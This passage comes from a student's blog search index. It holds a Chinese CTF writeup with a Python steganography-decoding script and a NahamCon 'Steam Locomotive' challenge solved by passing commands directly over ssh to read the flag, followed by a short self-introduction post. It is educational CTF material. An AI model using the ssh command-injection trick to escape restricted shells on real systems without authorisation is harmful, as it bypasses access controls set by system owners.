class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">if</span> origin.getpixel((x,y))[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>:<br>            zero_dot.append((x,y))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">38</span>):<br>    current_img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./extract/<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br>    width, height = current_img.size<br>    image = Image.new(current_img.mode, current_img.size)<br>    pixels = image.load()<br>    change_dot = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        <span class="hljs-keyword">if</span> change_dot <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>            pixels[x, y] = current_img.getpixel((x, y))<br>            <span class="hljs-keyword">if</span> pixels[x,y][<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> (x,y) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> zero_dot:<br>                    <span class="hljs-comment"># print(f&quot;&#123;i&#125; :&quot;,(x,y), &quot;is the change point&quot;)</span><br>                    change_dot = (x,y)<br><br>    origin_blue = origin.getpixel(change_dot)[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-comment"># 基本上都会出现两个字节长度</span><br>    value = <span class="hljs-built_in">bytes</span>([current_img.getpixel(change_dot)[<span class="hljs-number">0</span>],current_img.getpixel(change_dot)[<span class="hljs-number">1</span>]])<br>    value = b2l(value)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(value//origin_blue), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>以下是后面添加的。（2022/05/03）</p><h1 id="steam-locomotive"><a class="markdownIt-Anchor" href="#steam-locomotive"></a> Steam Locomotive</h1><p>这题很好玩。</p><p>用ssh链接目标服务器之后。执行的是SL这个命令，而且此时我们会被阻塞无法操作。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><br><br>                      (  ) (@<span class="hljs-meta">@)</span> ( )  (<span class="hljs-meta">@)</span>  ()    @@    O     @     O     @      O<br>                 (@@<span class="hljs-meta">@)</span><br>             (    )<br>          (@@@<span class="hljs-meta">@)</span><br><br>        (   )<br>      ====        ________                ___________<br>  _D _|<span class="hljs-string">  </span>|<span class="hljs-string">_______/        \__I_I_____===__</span>|<span class="hljs-string">_________</span>|<br>   |<span class="hljs-string">(_)---  </span>|<span class="hljs-string">   H\________/ </span>|<span class="hljs-string">   </span>|<span class="hljs-string">        =</span>|<span class="hljs-string">___ ___</span>|<span class="hljs-string">      _________________</span><br><span class="hljs-string">   /     </span>|<span class="hljs-string">  </span>|<span class="hljs-string">   H  </span>|<span class="hljs-string">  </span>|<span class="hljs-string">     </span>|<span class="hljs-string">   </span>|<span class="hljs-string">         </span>||<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>||<span class="hljs-string">     _</span>|<span class="hljs-string">                \_____A</span><br><span class="hljs-string">  </span>|<span class="hljs-string">      </span>|<span class="hljs-string">  </span>|<span class="hljs-string">   H  </span>|<span class="hljs-string">__--------------------</span>|<span class="hljs-string"> [___] </span>|<span class="hljs-string">   =</span>|<span class="hljs-string">                        </span>|<br>  |<span class="hljs-string"> ________</span>|<span class="hljs-string">___H__/__</span>|<span class="hljs-string">_____/[][]~\_______</span>|<span class="hljs-string">       </span>|<span class="hljs-string">   -</span>|<span class="hljs-string">                        </span>|<br>  |<span class="hljs-string">/ </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-----------I_____I [][] []  D   </span>|<span class="hljs-string">=======</span>|<span class="hljs-string">____</span>|<span class="hljs-string">________________________</span>|_<br>__/ =|<span class="hljs-string"> o </span>|<span class="hljs-string">=-~~\  /~~\  /~~\  /~~\ ____Y___________</span>|<span class="hljs-string">__</span>|<span class="hljs-string">__________________________</span>|_<br> |<span class="hljs-string">/-=</span>|<span class="hljs-string">___</span>|<span class="hljs-string">=O=====O=====O=====O   </span>|<span class="hljs-string">_____/~\___/          </span>|<span class="hljs-string">_D__D__D_</span>|<span class="hljs-string">  </span>|<span class="hljs-string">_D__D__D_</span>|<br>  \_/      \__/  \__/  \__/  \__/      \_/               \_/   \_/    \_/   \_/<br><br><br><br></code></pre></td></tr></table></figure><p>火车跑完，连接也断开了。这是一道简单题，但是我真的不会做。后面看别人的writeup才知道。原来ssh连接可以直接带命令。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\lanpesk&gt;ssh <span class="hljs-literal">-p</span> <span class="hljs-number">31404</span> user@challenge.nahamcon.com <span class="hljs-built_in">ls</span><br>user@challenge.nahamcon.com<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">flag.txt</span><br></code></pre></td></tr></table></figure><p>这里我们连接的时候直接带上一个ls命令。结果我们可以看到有个flag文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\lanpesk&gt;ssh <span class="hljs-literal">-p</span> <span class="hljs-number">31404</span> user@challenge.nahamcon.com <span class="hljs-built_in">cat</span> flag*<br>user@challenge.nahamcon.com<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">flag&#123;4f9b10a81141c7a07a494c28bd91d05b&#125;</span><br></code></pre></td></tr></table></figure><p>这样我们就能在ssh阻塞的情况下执行其他命令。算是学到了一些小知识。我觉得可以出在我们学校的新生赛里面嘿嘿。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>MISC</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/04/28/hello-world/"/>
    <url>/2022/04/28/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to my blog! This post I will introduce myself.</p><span id="more"></span><h2 id="who-am-i"><a class="markdownIt-Anchor" href="#who-am-i"></a> Who am I</h2><p>大学生一枚。计算机相关专业。如果有什么问题想和我讨论的话，请到github找我或者通过以下邮箱联系：</p><p><a href="mailto:professornameshou@gmail.com">professornameshou@gmail.com</a></p><h2 id="what-do-i-like"><a class="markdownIt-Anchor" href="#what-do-i-like"></a> What do I like</h2><p>当然是代码咯。还有各种有趣的项目。想做的事情那可真是太多了，但有时间我都会一一来做的。还有各种有趣的比赛，当然CTF也是其中之一。</p><p>以上就是我的自述啦。有什么问题还请邮件联系！希望我的博客能够帮助到你。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
